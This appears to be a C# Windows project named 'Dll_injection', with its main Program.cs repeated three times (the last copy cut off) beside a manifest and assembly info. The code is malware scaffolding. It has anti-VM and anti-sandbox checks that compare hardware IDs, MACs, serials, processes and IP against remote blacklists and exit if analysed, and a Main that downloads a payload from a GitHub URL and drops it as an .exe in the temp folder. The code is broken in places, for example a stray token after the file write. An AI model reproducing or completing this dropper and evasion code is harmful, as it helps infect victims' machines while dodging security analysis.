using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Management;
using System.Text;

namespace Dll_injection
{
    internal static class Program
    {
        static string GetBasePrefixCompat()
        {
            string basePrefix = (string)AppContext.GetData("System.Interactive.Isolation");
            return basePrefix ?? AppContext.BaseDirectory;
        }

        static bool InVirtualEnvironment(string basePrefix, string sysPrefix)
        {
            return basePrefix != sysPrefix;
        }

        static void CheckVirtualEnvironment()
        {
            string basePrefix = GetBasePrefixCompat();
            string sysPrefix = AppContext.BaseDirectory;

            if (InVirtualEnvironment(basePrefix, sysPrefix))
            {
                Environment.Exit(0);
            }
            else { }
        }


        static void HWID_VM()
        {
            Process process = new Process();
            process.StartInfo.FileName = "wmic";
            process.StartInfo.Arguments = "csproduct get uuid";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            string currentMachineID = process.StandardOutput.ReadToEnd().Split('\n')[1].Trim();
            process.WaitForExit();

            string hwidVM = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt");

            if (hwidVM.Contains(currentMachineID))
            {
                Environment.Exit(0);
            }
        }

        static void CheckPC()
        {
            string vmName = Environment.UserName;
            string vmNameList = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt");

            if (vmNameList.Contains(vmName))
            {
                Environment.Exit(0);
            }

            string vmUsernameList = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt");
            string hostName = Dns.GetHostName();

            if (vmUsernameList.Contains(hostName))
            {
                Environment.Exit(0);
            }
        }



        static void MacCheck()
        {
            string userMacAddress = GetMacAddress();

            WebClient client = new WebClient();
            string macList = client.DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt");

            if (macList.Contains(userMacAddress))
            {
                Environment.Exit(0);
            }
        }

        static string GetMacAddress()
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface nic in nics)
            {
                if (nic.NetworkInterfaceType != NetworkInterfaceType.Ethernet &&
                    nic.NetworkInterfaceType != NetworkInterfaceType.Wireless80211)
                    continue;

                PhysicalAddress address = nic.GetPhysicalAddress();
                byte[] bytes = address.GetAddressBytes();
                string macAddress = string.Join(":", bytes.Select(b => b.ToString("X2")));

                return macAddress;
            }
            return null;
        }


        static void ProcessesAndFilesCheck()
        {
            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string vmwareDll = Path.Combine(systemRoot, @"System32\vmGuestLib.dll");
            string virtualboxDll = Path.Combine(systemRoot, "vboxmrxnp.dll");

            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c TASKLIST /FI \"STATUS eq RUNNING\" | find /V \"Image Name\" | find /V \"=\"";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            string processOutput = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            string[] processList = processOutput.Split(new[] { ' ', '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)
                                               .Where(p => p.Contains(".exe"))
                                               .Select(p => p.Replace("K\n", "").Replace("\n", ""))
                                               .ToArray();

            if (processList.Contains("VMwareService.exe") || processList.Contains("VMwareTray.exe"))
            {
                Environment.Exit(0);
            }

            if (File.Exists(vmwareDll))
            {
                Environment.Exit(0);
            }

            if (File.Exists(virtualboxDll))
            {
                Environment.Exit(0);
            }

            try
            {
                IntPtr sandboxie = LoadLibrary("SbieDll.dll");
                Environment.Exit(0);
            }
            catch { }

            string processListUrl = "https://raw.githubusercontent.com/eid129382/d/main/process.txt";
            string[] remoteProcessList = new WebClient().DownloadString(processListUrl).Split('\n', '\r');

            if (remoteProcessList.Any(processName => processList.Contains(processName)))
            {
                Environment.Exit(0);
            }
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllToLoad);


        static void RegistryCheck()
        {
            string cmd = "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\";

            Process reg1Process = new Process();
            reg1Process.StartInfo.FileName = "cmd.exe";
            reg1Process.StartInfo.Arguments = $"/c {cmd}DriverDesc";
            reg1Process.StartInfo.RedirectStandardOutput = true;
            reg1Process.StartInfo.UseShellExecute = false;
            reg1Process.StartInfo.CreateNoWindow = true;

            Process reg2Process = new Process();
            reg2Process.StartInfo.FileName = "cmd.exe";
            reg2Process.StartInfo.Arguments = $"/c {cmd}ProviderName";
            reg2Process.StartInfo.RedirectStandardOutput = true;
            reg2Process.StartInfo.UseShellExecute = false;
            reg2Process.StartInfo.CreateNoWindow = true;

            reg1Process.Start();
            string reg1Output = reg1Process.StandardOutput.ReadToEnd();
            reg1Process.WaitForExit();

            reg2Process.Start();
            string reg2Output = reg2Process.StandardOutput.ReadToEnd();
            reg2Process.WaitForExit();

            if (!string.IsNullOrEmpty(reg1Output) && !string.IsNullOrEmpty(reg2Output))
            {
                Environment.Exit(0);
            }
        }


        static void CheckGPU()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration");
            string GPUm = "";

            foreach (ManagementObject gpu in searcher.Get())
            {
                GPUm = gpu["Description"].ToString().Trim();
            }

            string gpuList = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt");

            if (gpuList.Contains(GPUm))
            {
                Environment.Exit(0);
            }
        }



        static void CheckIP()
        {
            WebClient client = new WebClient();
            string ipList = client.DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt");

            string ip = new WebClient().DownloadString("https://api.ipify.org/?format=text");

            if (ipList.Contains(ip))
            {
                Environment.Exit(0);
            }
        }



        static void CheckProfiles()
        {
            string machineGuid = Guid.NewGuid().ToString();
            string guidPC = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt");

            if (guidPC.Contains(machineGuid))
            {
                Environment.Exit(0);
            }

            ManagementObjectSearcher biosSearcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_BIOS");
            string biosCheck = "";

            foreach (ManagementObject bios in biosSearcher.Get())
            {
                biosCheck = bios["SerialNumber"].ToString();
            }

            string biosGuid = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt");

            if (biosGuid.Contains(biosCheck))
            {
                Environment.Exit(0);
            }

            ManagementObjectSearcher baseboardSearcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_BaseBoard");
            string baseCheck = "";

            foreach (ManagementObject baseboard in baseboardSearcher.Get())
            {
                baseCheck = baseboard["SerialNumber"].ToString();
            }

            string baseboardGuid = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt");

            if (baseboardGuid.Contains(baseCheck))
            {
                Environment.Exit(0);
            }

            ManagementObjectSearcher diskDriveSearcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_DiskDrive");
            string diskSerial = "";

            foreach (ManagementObject disk in diskDriveSearcher.Get())
            {
                diskSerial = disk["SerialNumber"].ToString();
            }

            string serialDisk = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt");

            if (serialDisk.Contains(diskSerial))
            {
                Environment.Exit(0);
            }
        }

        // Your Program CODE IS HERE 

        /// <summary>
        /// 해당 애플리케이션의 주 진입점입니다.
        /// </summary>
        [STAThread]
        static void Main()
        {
            //            CheckVirtualEnvironment();
            //            RegistryCheck();
            //ProcessesAndFilesCheck();
            //MacCheck();
            //CheckPC();
            //HWID_VM();
            //CheckGPU();
            //CheckIP();
            //CheckProfiles();
            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());
            System.Text.UTF8Encoding encoder = new System.Text.UTF8Encoding();

            System.Text.Decoder utf8Decode = encoder.GetDecoder();
            string dll = new WebClient().DownloadString("https://raw.githubusercontent.com/eid129382/dll_injection/main/injection.dll");
            string temp = Path.GetTempPath();
            try
            {
                Random rand = new Random(40382);
                File.WriteAllText("" + temp + rand + ".exe", dll);
                i
            }
            catch
            {

            }
        }
    }
}
<?xml version="1.0" encoding="utf-8"?>
<assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1">
  <assemblyIdentity version="1.0.0.0" name="MyApplication.app" />
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
    <security>
      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
        <!-- UAC 매니페스트 옵션
             Windows 사용자 계정 컨트롤 수준을 변경하려면 
             requestedExecutionLevel 노드를 다음 중 하나로 바꿉니다.

        <requestedExecutionLevel  level="asInvoker" uiAccess="false" />
        <requestedExecutionLevel  level="requireAdministrator" uiAccess="false" />
        <requestedExecutionLevel  level="highestAvailable" uiAccess="false" />

            requestedExecutionLevel 요소를 지정하면 파일 및 레지스트리 가상화를 사용하지 않습니다. 
            이전 버전과의 호환성을 위해 애플리케이션에 가상화가 필요한 경우
            이 요소를 제거합니다.
        -->
        <requestedExecutionLevel level="asInvoker" uiAccess="false" />
      </requestedPrivileges>
      <applicationRequestMinimum>
        <defaultAssemblyRequest permissionSetReference="Custom" />
        <PermissionSet class="System.Security.PermissionSet" version="1" Unrestricted="true" ID="Custom" SameSite="site" />
      </applicationRequestMinimum>
    </security>
  </trustInfo>
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <!-- 이 애플리케이션이 테스트되고 함께 작동하도록 설계된 Windows 버전
           목록입니다. 해당 요소의 주석 처리를 제거하면 Windows에서
           호환 가능성이 가장 큰 환경을 자동으로 선택합니다. -->
      <!-- Windows Vista -->
      <!--<supportedOS Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}" />-->
      <!-- Windows 7 -->
      <!--<supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}" />-->
      <!-- Windows 8 -->
      <!--<supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}" />-->
      <!-- Windows 8.1 -->
      <!--<supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}" />-->
      <!-- Windows 10 -->
      <!--<supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}" />-->
    </application>
  </compatibility>
  <!-- 애플리케이션이 DPI를 인식하며 높은 DPI에서 Windows가 자동으로 스케일링하지
       않음을 나타냅니다. WPF(Windows Presentation Foundation) 애플리케이션은 자동으로 DPI를 인식하며 
       옵트인할 필요가 없습니다. 이 설정에 옵트인한 .NET Framework 4.6을 대상으로 하는 
       Windows Forms 애플리케이션은 app.config에서 'EnableWindowsFormsHighDpiAutoResizing' 설정도 'true'로 설정해야 합니다. 
       
       애플리케이션이 긴 경로를 인식하도록 설정합니다. https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation을 참조하세요. -->
  <!--
  <application xmlns="urn:schemas-microsoft-com:asm.v3">
    <windowsSettings>
      <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</dpiAware>
      <longPathAware xmlns="http://schemas.microsoft.com/SMI/2016/WindowsSettings">true</longPathAware>
    </windowsSettings>
  </application>
  -->
  <!-- Windows 공용 컨트롤 및 대화 상자의 테마 사용(Windows XP 이상) -->
  <!--
  <dependency>
    <dependentAssembly>
      <assemblyIdentity
          type="win32"
          name="Microsoft.Windows.Common-Controls"
          version="6.0.0.0"
          processorArchitecture="*"
          publicKeyToken="6595b64144ccf1df"
          language="*"
        />
    </dependentAssembly>
  </dependency>
  -->
</assembly>
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

// 어셈블리에 대한 일반 정보는 다음 특성 집합을 통해 
// 제어됩니다. 어셈블리와 관련된 정보를 수정하려면
// 이러한 특성 값을 변경하세요.
[assembly: AssemblyTitle("Dll_injection")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("Dll_injection")]
[assembly: AssemblyCopyright("Copyright ©  2024")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

// ComVisible을 false로 설정하면 이 어셈블리의 형식이 COM 구성 요소에 
// 표시되지 않습니다. COM에서 이 어셈블리의 형식에 액세스하려면
// 해당 형식에 대해 ComVisible 특성을 true로 설정하세요.
[assembly: ComVisible(false)]

// 이 프로젝트가 COM에 노출되는 경우 다음 GUID는 typelib의 ID를 나타냅니다.
[assembly: Guid("253a2d72-d1eb-44e8-877f-14c7ba59aa0d")]

// 어셈블리의 버전 정보는 다음 네 가지 값으로 구성됩니다.
//
//      주 버전
//      부 버전 
//      빌드 번호
//      수정 버전
//
// 모든 값을 지정하거나 아래와 같이 '*'를 사용하여 빌드 번호 및 수정 번호를
// 기본값으로 할 수 있습니다.
// [assembly: AssemblyVersion("1.0.*")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Management;
using System.Text;

namespace Dll_injection
{
    internal static class Program
    {
        static string GetBasePrefixCompat()
        {
            string basePrefix = (string)AppContext.GetData("System.Interactive.Isolation");
            return basePrefix ?? AppContext.BaseDirectory;
        }

        static bool InVirtualEnvironment(string basePrefix, string sysPrefix)
        {
            return basePrefix != sysPrefix;
        }

        static void CheckVirtualEnvironment()
        {
            string basePrefix = GetBasePrefixCompat();
            string sysPrefix = AppContext.BaseDirectory;

            if (InVirtualEnvironment(basePrefix, sysPrefix))
            {
                Environment.Exit(0);
            }
            else { }
        }


        static void HWID_VM()
        {
            Process process = new Process();
            process.StartInfo.FileName = "wmic";
            process.StartInfo.Arguments = "csproduct get uuid";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            string currentMachineID = process.StandardOutput.ReadToEnd().Split('\n')[1].Trim();
            process.WaitForExit();

            string hwidVM = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt");

            if (hwidVM.Contains(currentMachineID))
            {
                Environment.Exit(0);
            }
        }

        static void CheckPC()
        {
            string vmName = Environment.UserName;
            string vmNameList = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt");

            if (vmNameList.Contains(vmName))
            {
                Environment.Exit(0);
            }

            string vmUsernameList = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt");
            string hostName = Dns.GetHostName();

            if (vmUsernameList.Contains(hostName))
            {
                Environment.Exit(0);
            }
        }



        static void MacCheck()
        {
            string userMacAddress = GetMacAddress();

            WebClient client = new WebClient();
            string macList = client.DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt");

            if (macList.Contains(userMacAddress))
            {
                Environment.Exit(0);
            }
        }

        static string GetMacAddress()
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface nic in nics)
            {
                if (nic.NetworkInterfaceType != NetworkInterfaceType.Ethernet &&
                    nic.NetworkInterfaceType != NetworkInterfaceType.Wireless80211)
                    continue;

                PhysicalAddress address = nic.GetPhysicalAddress();
                byte[] bytes = address.GetAddressBytes();
                string macAddress = string.Join(":", bytes.Select(b => b.ToString("X2")));

                return macAddress;
            }
            return null;
        }


        static void ProcessesAndFilesCheck()
        {
            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string vmwareDll = Path.Combine(systemRoot, @"System32\vmGuestLib.dll");
            string virtualboxDll = Path.Combine(systemRoot, "vboxmrxnp.dll");

            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c TASKLIST /FI \"STATUS eq RUNNING\" | find /V \"Image Name\" | find /V \"=\"";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            string processOutput = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            string[] processList = processOutput.Split(new[] { ' ', '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)
                                               .Where(p => p.Contains(".exe"))
                                               .Select(p => p.Replace("K\n", "").Replace("\n", ""))
                                               .ToArray();

            if (processList.Contains("VMwareService.exe") || processList.Contains("VMwareTray.exe"))
            {
                Environment.Exit(0);
            }

            if (File.Exists(vmwareDll))
            {
                Environment.Exit(0);
            }

            if (File.Exists(virtualboxDll))
            {
                Environment.Exit(0);
            }

            try
            {
                IntPtr sandboxie = LoadLibrary("SbieDll.dll");
                Environment.Exit(0);
            }
            catch { }

            string processListUrl = "https://raw.githubusercontent.com/eid129382/d/main/process.txt";
            string[] remoteProcessList = new WebClient().DownloadString(processListUrl).Split('\n', '\r');

            if (remoteProcessList.Any(processName => processList.Contains(processName)))
            {
                Environment.Exit(0);
            }
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllToLoad);


        static void RegistryCheck()
        {
            string cmd = "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\";

            Process reg1Process = new Process();
            reg1Process.StartInfo.FileName = "cmd.exe";
            reg1Process.StartInfo.Arguments = $"/c {cmd}DriverDesc";
            reg1Process.StartInfo.RedirectStandardOutput = true;
            reg1Process.StartInfo.UseShellExecute = false;
            reg1Process.StartInfo.CreateNoWindow = true;

            Process reg2Process = new Process();
            reg2Process.StartInfo.FileName = "cmd.exe";
            reg2Process.StartInfo.Arguments = $"/c {cmd}ProviderName";
            reg2Process.StartInfo.RedirectStandardOutput = true;
            reg2Process.StartInfo.UseShellExecute = false;
            reg2Process.StartInfo.CreateNoWindow = true;

            reg1Process.Start();
            string reg1Output = reg1Process.StandardOutput.ReadToEnd();
            reg1Process.WaitForExit();

            reg2Process.Start();
            string reg2Output = reg2Process.StandardOutput.ReadToEnd();
            reg2Process.WaitForExit();

            if (!string.IsNullOrEmpty(reg1Output) && !string.IsNullOrEmpty(reg2Output))
            {
                Environment.Exit(0);
            }
        }


        static void CheckGPU()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration");
            string GPUm = "";

            foreach (ManagementObject gpu in searcher.Get())
            {
                GPUm = gpu["Description"].ToString().Trim();
            }

            string gpuList = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt");

            if (gpuList.Contains(GPUm))
            {
                Environment.Exit(0);
            }
        }



        static void CheckIP()
        {
            WebClient client = new WebClient();
            string ipList = client.DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt");

            string ip = new WebClient().DownloadString("https://api.ipify.org/?format=text");

            if (ipList.Contains(ip))
            {
                Environment.Exit(0);
            }
        }



        static void CheckProfiles()
        {
            string machineGuid = Guid.NewGuid().ToString();
            string guidPC = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt");

            if (guidPC.Contains(machineGuid))
            {
                Environment.Exit(0);
            }

            ManagementObjectSearcher biosSearcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_BIOS");
            string biosCheck = "";

            foreach (ManagementObject bios in biosSearcher.Get())
            {
                biosCheck = bios["SerialNumber"].ToString();
            }

            string biosGuid = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt");

            if (biosGuid.Contains(biosCheck))
            {
                Environment.Exit(0);
            }

            ManagementObjectSearcher baseboardSearcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_BaseBoard");
            string baseCheck = "";

            foreach (ManagementObject baseboard in baseboardSearcher.Get())
            {
                baseCheck = baseboard["SerialNumber"].ToString();
            }

            string baseboardGuid = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt");

            if (baseboardGuid.Contains(baseCheck))
            {
                Environment.Exit(0);
            }

            ManagementObjectSearcher diskDriveSearcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_DiskDrive");
            string diskSerial = "";

            foreach (ManagementObject disk in diskDriveSearcher.Get())
            {
                diskSerial = disk["SerialNumber"].ToString();
            }

            string serialDisk = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt");

            if (serialDisk.Contains(diskSerial))
            {
                Environment.Exit(0);
            }
        }

        // Your Program CODE IS HERE 

        /// <summary>
        /// 해당 애플리케이션의 주 진입점입니다.
        /// </summary>
        [STAThread]
        static void Main()
        {
            //            CheckVirtualEnvironment();
            //            RegistryCheck();
            //ProcessesAndFilesCheck();
            //MacCheck();
            //CheckPC();
            //HWID_VM();
            //CheckGPU();
            //CheckIP();
            //CheckProfiles();
            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());
            System.Text.UTF8Encoding encoder = new System.Text.UTF8Encoding();

            System.Text.Decoder utf8Decode = encoder.GetDecoder();
            string dll = new WebClient().DownloadString("https://raw.githubusercontent.com/eid129382/dll_injection/main/injection.dll");
            string temp = Path.GetTempPath();
            try
            {
                Random rand = new Random(40382);
                File.WriteAllText("" + temp + rand + ".exe", dll);
                i
            }
            catch
            {

            }
        }
    }
}
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Management;
using System.Text;

namespace Dll_injection
{
    internal static class Program
    {
        static string GetBasePrefixCompat()
        {
            string basePrefix = (string)AppContext.GetData("System.Interactive.Isolation");
            return basePrefix ?? AppContext.BaseDirectory;
        }

        static bool InVirtualEnvironment(string basePrefix, string sysPrefix)
        {
            return basePrefix != sysPrefix;
        }

        static void CheckVirtualEnvironment()
        {
            string basePrefix = GetBasePrefixCompat();
            string sysPrefix = AppContext.BaseDirectory;

            if (InVirtualEnvironment(basePrefix, sysPrefix))
            {
                Environment.Exit(0);
            }
            else { }
        }


        static void HWID_VM()
        {
            Process process = new Process();
            process.StartInfo.FileName = "wmic";
            process.StartInfo.Arguments = "csproduct get uuid";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            string currentMachineID = process.StandardOutput.ReadToEnd().Split('\n')[1].Trim();
            process.WaitForExit();

            string hwidVM = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt");

            if (hwidVM.Contains(currentMachineID))
            {
                Environment.Exit(0);
            }
        }

        static void CheckPC()
        {
            string vmName = Environment.UserName;
            string vmNameList = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt");

            if (vmNameList.Contains(vmName))
            {
                Environment.Exit(0);
            }

            string vmUsernameList = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt");
            string hostName = Dns.GetHostName();

            if (vmUsernameList.Contains(hostName))
            {
                Environment.Exit(0);
            }
        }



        static void MacCheck()
        {
            string userMacAddress = GetMacAddress();

            WebClient client = new WebClient();
            string macList = client.DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt");

            if (macList.Contains(userMacAddress))
            {
                Environment.Exit(0);
            }
        }

        static string GetMacAddress()
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface nic in nics)
            {
                if (nic.NetworkInterfaceType != NetworkInterfaceType.Ethernet &&
                    nic.NetworkInterfaceType != NetworkInterfaceType.Wireless80211)
                    continue;

                PhysicalAddress address = nic.GetPhysicalAddress();
                byte[] bytes = address.GetAddressBytes();
                string macAddress = string.Join(":", bytes.Select(b => b.ToString("X2")));

                return macAddress;
            }
            return null;
        }


        static void ProcessesAndFilesCheck()
        {
            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string vmwareDll = Path.Combine(systemRoot, @"System32\vmGuestLib.dll");
            string virtualboxDll = Path.Combine(systemRoot, "vboxmrxnp.dll");

            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c TASKLIST /FI \"STATUS eq RUNNING\" | find /V \"Image Name\" | find /V \"=\"";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            string processOutput = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            string[] processList = processOutput.Split(new[] { ' ', '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)
                                               .Where(p => p.Contains(".exe"))
                                               .Select(p => p.Replace("K\n", "").Replace("\n", ""))
                                               .ToArray();

            if (processList.Contains("VMwareService.exe") || processList.Contains("VMwareTray.exe"))
            {
                Environment.Exit(0);
            }

            if (File.Exists(vmwareDll))
            {
                Environment.Exit(0);
            }

            if (File.Exists(virtualboxDll))
            {
                Environment.Exit(0);
            }

            try
            {
                IntPtr sandboxie = LoadLibrary("SbieDll.dll");
                Environment.Exit(0);
            }
            catch { }

            string processListUrl = "https://raw.githubusercontent.com/eid129382/d/main/process.txt";
            string[] remoteProcessList = new WebClient().DownloadString(processListUrl).Split('\n', '\r');

            if (remoteProcessList.Any(processName => processList.Contains(processName)))
            {
                Environment.Exit(0);
            }
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllToLoad);


        static void RegistryCheck()
        {
            string cmd = "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\";

            Process reg1Process = new Process();
            reg1Process.StartInfo.FileName = "cmd.exe";
            reg1Process.StartInfo.Arguments = $"/c {cmd}DriverDesc";
            reg1Process.StartInfo.RedirectStandardOutput = true;
            reg1Process.StartInfo.UseShellExecute = false;
            reg1Process.StartInfo.CreateNoWindow = true;

            Process reg2Process = new Process();
            reg2Process.StartInfo.FileName = "cmd.exe";
            reg2Process.StartInfo.Arguments = $"/c {cmd}ProviderName";
            reg2Process.StartInfo.RedirectStandardOutput = true;
            reg2Process.StartInfo.UseShellExecute = false;
            reg2Process.StartInfo.CreateNoWindow = true;

            reg1Process.Start();
            string reg1Output = reg1Process.StandardOutput.ReadToEnd();
            reg1Process.WaitForExit();

            reg2Process.Start();
            string reg2Output = reg2Process.StandardOutput.ReadToEnd();
            reg2Process.WaitForExit();

            if (!string.IsNullOrEmpty(reg1Output) && !string.IsNullOrEmpty(reg2Output))
            {
                Environment.Exit(0);
            }
        }


        static void CheckGPU()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration");
            string GPUm = "";

            foreach (ManagementObject gpu in searcher.Get())
            {
                GPUm = gpu["Description"].ToString().Trim();
            }

            string gpuList = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt");

            if (gpuList.Contains(GPUm))
            {
                Environment.Exit(0);
            }
        }



        static void CheckIP()
        {
            WebClient client = new WebClient();
            string ipList = client.DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt");

            string ip = new WebClient().DownloadString("https://api.ipify.org/?format=text");

            if (ipList.Contains(ip))
            {
                Environment.Exit(0);
            }
        }



        static void CheckProfiles()
        {
            string machineGuid = Guid.NewGuid().ToString();
            string guidPC = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt");

            if (guidPC.Contains(machineGuid))
            {
                Environment.Exit(0);
            }

            ManagementObjectSearcher biosSearcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_BIOS");
            string biosCheck = "";

            foreach (ManagementObject bios in biosSearcher.Get())
            {
                biosCheck = bios["SerialNumber"].ToString();
            }

            string biosGuid = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt");

            if (biosGuid.Contains(biosCheck))
            {
                Environment.Exit(0);
            }

            ManagementObjectSearcher baseboardSearcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_BaseBoard");
            string baseCheck = "";

            foreach (ManagementObject baseboard in baseboardSearcher.Get())
            {
                baseCheck = baseboard["SerialNumber"].ToString();
            }

            string baseboardGuid = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt");

            if (baseboardGuid.Contains(baseCheck))
            {
                Environment.Exit(0);
            }

            ManagementObjectSearcher diskDriveSearcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_DiskDrive");
            string diskSerial = "";

            foreach (ManagementObject disk in diskDriveSearcher.Get())
            {
